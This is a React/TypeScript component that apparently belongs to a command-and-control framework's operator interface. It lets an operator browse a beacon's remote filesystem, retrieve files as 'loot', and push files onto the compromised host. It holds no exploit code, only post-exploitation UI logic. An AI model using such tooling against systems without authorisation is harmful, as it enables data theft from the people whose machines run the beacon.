import { useState, useEffect, useRef, useCallback } from 'react';
import { createTask, getTask, downloadLootFile, uploadFile } from '../services/api';
import * as path from 'path-browserify';

interface FileBrowserProps {
  beaconId: string;
}

interface FileInfo {
  name: string;
  is_dir: boolean;
  size: number;
  permissions: string;
  lastModified: string;
}

interface ParsedOutput {
  path: string;
  files: FileInfo[];
}

// Custom function to get the parent path, more robust than path.dirname for our use case
const getParentPath = (p: string): string => {
  const parts = p.split(path.sep);
  // Handle Windows drive letters like C:\
  if (parts.length === 2 && parts[1] === '') { // e.g., ['C:', '']
    return p; // Already at the root of a drive
  }
  if (parts.length <= 1) { // Already at root or invalid path (e.g., '/' or '')
    return path.sep; // Return root
  }
  return parts.slice(0, -1).join(path.sep) || path.sep; // Join all but last part, or return root if empty
};

// Parses the structured output from the beacon's browse command.
const parseBrowseOutput = (output: string): ParsedOutput => {
  const lines = output.trim().split('\n');
  if (lines.length === 0) return { path: '', files: [] };

  const currentPath = lines[0].trim(); // First line is the current path (from pwd)

  // Remaining lines are the JSON array of FileInfo
  const jsonFiles = lines.slice(1).join('\n'); 

  try {
    const files = JSON.parse(jsonFiles) as FileInfo[];
    return { path: currentPath, files: files };
  } catch (e) {
    console.error("Failed to parse JSON file list:", e);
    return { path: currentPath, files: [] };
  }
};

const FileBrowser = ({ beaconId }: FileBrowserProps) => {
  const [files, setFiles] = useState<FileInfo[]>([]);
  const [currentPath, setCurrentPath] = useState('~');
  const [requestedPath, setRequestedPath] = useState('.'); // Path for navigation
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [fileOpStatus, setFileOpStatus] = useState<Record<string, string>>({});
  const fileInputRef = useRef<HTMLInputElement>(null);
  const activePollId = useRef<number | null>(null); // To store the current interval ID

  const browsePath = useCallback((path_to_browse: string) => {
    // Clear any existing poll before starting a new one
    if (activePollId.current) {
      clearInterval(activePollId.current);
    }

    setIsLoading(true);
    setError('');
    setFiles([]);
    
    createTask(beaconId, 'browse', path_to_browse)
      .then(task => {
        const poll = setInterval(async () => {
          try {
            const updatedTask = await getTask(task.TaskID);
            if (updatedTask.Status === 'completed' || updatedTask.Status === 'error' || updatedTask.Status === 'Timeout') {
              clearInterval(poll);
              activePollId.current = null;
              setIsLoading(false);
              if (updatedTask.Status === 'completed') {
                const parsed = parseBrowseOutput(updatedTask.Output);
                setCurrentPath(parsed.path);
                setFiles(parsed.files);
              } else {
                setError(`Failed to list files: ${updatedTask.Status}`);
              }
            }
          } catch (pollError) {
            console.error('Error during browse task polling:', pollError);
            clearInterval(poll);
            activePollId.current = null;
            setIsLoading(false);
            setError('Error during browse task polling.');
          }
        }, 3000);
        activePollId.current = poll as unknown as number;
      })
      .catch(err => {
        console.error("Failed to create browse files task:", err);
        setError('Failed to create browse files task.');
        setIsLoading(false);
      });
  }, [beaconId]); // useCallback depends on beaconId

  // Effect for initial load and navigation
  useEffect(() => {
    browsePath(requestedPath);
  }, [requestedPath, browsePath]); // Runs when requestedPath changes

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (activePollId.current) {
        clearInterval(activePollId.current);
      }
    };
  }, []);

  const handleRefresh = () => {
    browsePath(currentPath);
  };

  const handleDownloadFromBeacon = async (filename: string) => {
    const fullPath = path.join(currentPath, filename);
    setFileOpStatus(prev => ({ ...prev, [filename]: 'queued' }));
    try {
      const task = await createTask(beaconId, 'upload', fullPath);
      const poll = setInterval(async () => {
        const updatedTask = await getTask(task.TaskID);
        if (updatedTask.Status === 'completed' || updatedTask.Status === 'error' || updatedTask.Status === 'Timeout') {
          clearInterval(poll);
          if (updatedTask.Status === 'completed') {
            setFileOpStatus(prev => ({ ...prev, [filename]: 'downloading' }));
            const lootFilename = updatedTask.Output;
            const blob = await downloadLootFile(lootFilename);
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            a.remove();
            setFileOpStatus(prev => ({ ...prev, [filename]: 'done' }));
          } else {
            setFileOpStatus(prev => ({ ...prev, [filename]: 'error' }));
          }
        }
      }, 3000);
    } catch (err) {
      console.error(`Failed to create upload task for ${filename}:`, err);
      setFileOpStatus(prev => ({ ...prev, [filename]: 'error' }));
    }
  };

  const handleUploadToBeacon = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const filename = file.name;
    setFileOpStatus(prev => ({ ...prev, [filename]: 'uploading' }));
    try {
      const uploadResponse = await uploadFile(file);
      const serverPath = uploadResponse.filepath;
      const destinationPath = path.join(currentPath, filename);
      const args = JSON.stringify({ source: serverPath, destination: destinationPath });
      await createTask(beaconId, 'download', args);
      setFileOpStatus(prev => ({ ...prev, [filename]: 'tasked' }));
    } catch (err) {
      console.error(`Failed to upload file to beacon ${filename}:`, err);
      setFileOpStatus(prev => ({ ...prev, [filename]: 'error' }));
    }
  };

  return (
    <div className="card bg-dark border-secondary text-light mt-n1" style={{borderTopLeftRadius: 0, borderTopRightRadius: 0}}>
      <div className="card-header d-flex justify-content-between align-items-center">
        <span>File Browser: <code>{currentPath}</code></span>
        <div>
          <input type="file" ref={fileInputRef} style={{ display: 'none' }} onChange={handleUploadToBeacon} />
          <button className="btn btn-sm btn-success me-2" onClick={() => fileInputRef.current?.click()}>Upload File</button>
          <button className="btn btn-sm btn-outline-secondary" onClick={handleRefresh} disabled={isLoading}>
            {isLoading ? 'Loading...' : 'Refresh'}
          </button>
        </div>
      </div>
      <div className="card-body" style={{minHeight: '300px'}}>
        {error && <div className="alert alert-danger">{error}</div>}
        <table className="table table-dark table-hover table-sm">
          <thead>
            <tr>
              <th>Name</th>
              <th>Permissions</th>
              <th>Size</th>
              <th>Last Modified</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            <tr onClick={() => {
              const newPath = getParentPath(currentPath);
              console.log('Navigating UP. currentPath:', currentPath, 'newPath:', newPath);
              setRequestedPath(newPath);
            }} style={{ cursor: 'pointer' }}>
              <td className="text-primary">📂 ..</td>
              <td></td><td></td><td></td><td></td>
            </tr>
            {files.map((file, index) => (
              <tr key={index}>
                <td onClick={() => {
                  if (file.is_dir) {
                    const newPath = path.join(currentPath, file.name);
                    console.log('Navigating INTO. currentPath:', currentPath, 'clicked file:', file.name, 'newPath:', newPath);
                    setRequestedPath(newPath);
                  }
                }} style={{ cursor: file.is_dir ? 'pointer' : 'default' }}>
                  <span className={file.is_dir ? 'text-primary' : ''}> {file.is_dir ? '📂' : '📄'} {file.name}</span>
                </td>
                <td><code>{file.permissions}</code></td>
                <td>{file.size}</td>
                <td>{file.lastModified}</td>
                <td>
                  {!file.is_dir && (
                    <button 
                      className="btn btn-sm btn-outline-light"
                      onClick={() => handleDownloadFromBeacon(file.name)}
                      disabled={!!fileOpStatus[file.name] && fileOpStatus[file.name] !== 'done' && fileOpStatus[file.name] !== 'error'}
                    >
                      {fileOpStatus[file.name] === 'queued' && 'Queued...'}
                      {fileOpStatus[file.name] === 'downloading' && 'Downloading...'}
                      {(!fileOpStatus[file.name] || fileOpStatus[file.name] === 'done' || fileOpStatus[file.name] === 'error') && 'Download'}
                    </button>
                  )}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
};

export default FileBrowser;
